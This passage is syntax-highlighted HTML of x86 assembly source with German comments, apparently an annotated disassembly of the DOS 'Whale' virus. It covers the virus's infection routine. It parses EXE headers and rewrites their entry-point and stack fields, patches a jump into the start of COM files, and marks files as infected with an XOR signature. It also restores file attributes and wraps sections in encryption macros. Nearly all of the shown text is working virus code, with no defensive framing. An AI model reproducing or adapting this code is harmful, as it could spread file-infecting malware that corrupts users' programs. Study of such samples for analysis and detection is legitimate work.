                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">07C8h</span><span class="sc0">        </span><span class="sc1">; 1992</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">J0361A</span><span class="sc0">          </span><span class="sc1">; CX &gt;= 1992 : Setze [Error],1</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">07C7h</span><span class="sc0">        </span><span class="sc1">; 1991</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J03620</span><span class="sc0">          </span><span class="sc1">; CX &lt;&gt; 1991 : Lasse [Error]</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">          </span><span class="sc1">; April</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">J03620</span><span class="sc0">          </span><span class="sc1">; DH &lt; APRIL : Lasse [Error]</span><span class="sc0">
                </span><span class="sc1">;-----------------------------------------------------</span><span class="sc0">
</span><span class="sc5">J0361A</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc10">Error</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">J03620</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc10">Error</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J0362F</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PopALL</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03632</span><span class="sc0">
                </span><span class="sc1">;--------------</span><span class="sc0">
</span><span class="sc5">J0362F</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PopALL</span><span class="sc0">
</span><span class="sc5">J03632</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">49</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc10">Error</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03641</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03761</span><span class="sc0">  </span><span class="sc1">; Returnadresse bleibt auf Stack...</span><span class="sc0">
</span><span class="sc5">J03641</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;==================================( "JMP Decode_Whale" schreiben )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J03642</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0">
                </span><span class="sc1">;-------------------------------------------------------</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc2">0001h</span><span class="sc4">],</span><span class="sc2">0E9h</span><span class="sc0">     </span><span class="sc1">; JMP 23BC /4BCC</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc2">0002h</span><span class="sc4">],</span><span class="sc2">0B8h</span><span class="sc0">     </span><span class="sc1">; CS:0001=CS:2811</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc2">0003h</span><span class="sc4">],</span><span class="sc2">023h</span><span class="sc0">
                </span><span class="sc1">;--------------------------------------------------</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Trace_int_13h</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J0378C</span><span class="sc0">  </span><span class="sc1">; errechnet unter anderem Paras fÅr File</span><span class="sc0">
                                </span><span class="sc1">; SI = benîtigte Paragrafen</span><span class="sc0">
                                </span><span class="sc1">; CX = 10h</span><span class="sc0">
                                </span><span class="sc1">; DX:AX = Filesize gerundet</span><span class="sc0">
                                </span><span class="sc1">; auf nÑchsten Paragrafen</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">EXE_FLAG</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">CodBuf</span><span class="sc4">],</span><span class="sc12">'MZ'</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">50</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J0367E</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Exe_Flag</span><span class="sc4">-</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">VirStart</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J036F9</span><span class="sc0">          </span><span class="sc1">; Wenn EXE-FLAG "1" war,</span><span class="sc0">
                                        </span><span class="sc1">; also immer (!)</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=========================================(  EXE-Header auswerten )===</span><span class="sc0">
</span><span class="sc1">;=========================================( Infektion vorbereiten )===</span><span class="sc0">
</span><span class="sc1">;=====================( die Berechnung scheint fehlerhaft zu sein )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J0367E</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">51</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">CodBuf</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Pages</span><span class="sc0">
                </span><span class="sc6">SHL</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; CX = 20h</span><span class="sc0">
                </span><span class="sc6">MUL</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">              </span><span class="sc1">; AX ist ((LÑnge-1) div 200h)*20h</span><span class="sc0">
                                        </span><span class="sc1">; Also jetzt : (LÑnge-1) DIV 10H</span><span class="sc0">
                                        </span><span class="sc1">; AX enthÑlt die benîtigte Anzahl</span><span class="sc0">
                                        </span><span class="sc1">; Paragrafen, um EXE zu laden.</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc0">        </span><span class="sc1">; AX=AX+200h, gibt keinen Sinn</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; Vergleiche AX mit Max-Paras</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">51</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">J036F6</span><span class="sc0">          </span><span class="sc1">; jmp, wenn AX kleiner ist</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">CodBuf</span><span class="sc4">+</span><span class="sc2">0Ah</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; MinFree</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">CodBuf</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; MaxFree</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J036F6</span><span class="sc0">
                </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">52</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">FileSize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">FileSize</span><span class="sc0">  </span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">DIV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">              </span><span class="sc1">; AX = (DX:AX) / 512; -&gt; Pages</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; Blieb ein Rest ???</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">52</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J036B8</span><span class="sc0">          </span><span class="sc1">; ja..</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc5">J036B8</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">CodBuf</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">  </span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">     </span><span class="sc1">; LÑnge LastPage</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">CodBuf</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">  </span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">     </span><span class="sc1">; Anzahl Pages</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">CodBuf</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],+</span><span class="sc2">01h</span><span class="sc0">   </span><span class="sc1">; IP-Init = 1?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J036CA</span><span class="sc0">                          </span><span class="sc1">; ( Whale !)</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03761</span><span class="sc0">                          </span><span class="sc1">; dann fertig !</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0E8h</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">J036CA</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_Verfallsdatum</span><span class="sc0">
                </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">53</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">CodBuf</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc2">0001h</span><span class="sc0">
                                                        </span><span class="sc1">; IP-INIT = 0001h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">                           </span><span class="sc1">; MaxParas -&gt; AX</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">CodBuf</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; AX=AX-Headerparas</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">CodBuf</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc0"> </span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">    </span><span class="sc1">; CS-INIT &lt;-AX !!!!</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">CodBuf</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">   </span><span class="sc4">],+</span><span class="sc2">12h</span><span class="sc0">  </span><span class="sc1">; 12 Pages dazu</span><span class="sc0">
                                                        </span><span class="sc1">; (== Whale-Size )</span><span class="sc0">
                </span><span class="sc1">;-----------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">; eine andere Art, ein Virus zu entdecken :</span><span class="sc0">
                </span><span class="sc1">; Wenn ein EXE wie ein COM initialisiert wird...</span><span class="sc0">
                </span><span class="sc1">;-----------------------------------------------------------</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">CodBuf</span><span class="sc4">+</span><span class="sc2">010h</span><span class="sc4">],</span><span class="sc2">0FFFEh</span><span class="sc1">; SP-Init = COM-LIKE</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">CodBuf</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Eh</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">    </span><span class="sc1">; SS-Init = CS-Init</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">53</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Infect_File</span><span class="sc0">
</span><span class="sc5">J036F6</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03761</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=======================================( Verfahren fÅr COM-Files )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J036F9</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">0F00h</span><span class="sc0">        </span><span class="sc1">; COM-Size &gt; 61440 Byte ?!?</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">J03761</span><span class="sc0">          </span><span class="sc1">; Dann geht es eben nicht ...</span><span class="sc0">

                </span><span class="sc1">;--------------( merken der ersten 6 Byte des COM )---</span><span class="sc0">
                </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">54</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">CodBuf</span><span class="sc0">  </span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; whale:</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0004h</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">    </span><span class="sc1">; AX = 20CC</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                     </span><span class="sc1">; DX = 0, da COM</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">CodBuf</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0006h</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">    </span><span class="sc1">; AX = 0</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                     </span><span class="sc1">; DX = 20CC</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">CodBuf</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; AX = 0</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0008h</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">5348h</span><span class="sc0">  </span><span class="sc1">; 'SH' !!       ; AX = 5348</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4649h</span><span class="sc0">  </span><span class="sc1">; 'FI' !!       ; AX = 1501</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">                     </span><span class="sc1">; DX = 35CD</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">54</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J03761</span><span class="sc0">     </span><span class="sc1">; DX = 0 -&gt; Keine Infektion ,</span><span class="sc0">
                                   </span><span class="sc1">; File kann nicht markiert werden.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">D24F2</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Hole Fileattribut</span><span class="sc0">
                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                  </span><span class="sc1">; Ist es SYSTEM ?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J03761</span><span class="sc0">                  </span><span class="sc1">; jmp, wenn ja</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Check_Verfallsdatum</span><span class="sc0">

                </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">55</span><span class="sc0">
                </span><span class="sc1">;---------------------( JMP am COM-Start erzeugen )---</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0010h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">CodBuf</span><span class="sc4">],</span><span class="sc8">CL</span><span class="sc0">
                </span><span class="sc6">MUL</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">                       </span><span class="sc1">; AX = COM-LÑnge in Byte,</span><span class="sc0">
                                                 </span><span class="sc1">; auf ganzen Paragrafen</span><span class="sc0">
                                                 </span><span class="sc1">; gerundet</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">23B9h</span><span class="sc0">                 </span><span class="sc1">; So weit also + 3 Byte</span><span class="sc0">
                                                 </span><span class="sc1">; zum De-Cryptor</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">CodBuf</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc1">; hier also "JMP J04BCC"</span><span class="sc0">
                </span><span class="sc1">;----------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;-----------------( File als infiziert markieren )---</span><span class="sc0">
                </span><span class="sc1">;----------------------------------------------------</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">CodBuf</span><span class="sc0">  </span><span class="sc4">]</span><span class="sc1">; AX = C9E9</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">CodBuf</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc1">; AX = C9E9+004A =CA33</span><span class="sc0">
                </span><span class="sc6">NEG</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                       </span><span class="sc1">; AX = - AX = 35CD</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4649h</span><span class="sc0">  </span><span class="sc1">; 'FI' !!      ; AX = 7384</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">5348h</span><span class="sc0">  </span><span class="sc1">; 'SH' !!      ; AX = 20CC (!!)</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">CodBuf</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc1">; Siehe Label "start"</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">55</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Infect_File</span><span class="sc0">
</span><span class="sc1">;--------------------------------------( Ende der Infektionsphase )---</span><span class="sc0">
</span><span class="sc5">J03761</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">56</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                  </span><span class="sc1">; CLOSE FILE</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24F2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">                </span><span class="sc1">; Change File-Attribut</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24F4</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Offset Filename</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">D24F6</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Segment Filename</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J048CD</span><span class="sc0">          </span><span class="sc1">; RESET Int 13h und Int 24h</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">56</span><span class="sc0">              </span><span class="sc1">; Alles ist so wie vorher...</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;====================================( Vorbereitung fÅr Infektion )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J0378C</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">57</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                </span><span class="sc1">; Get File-date</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">

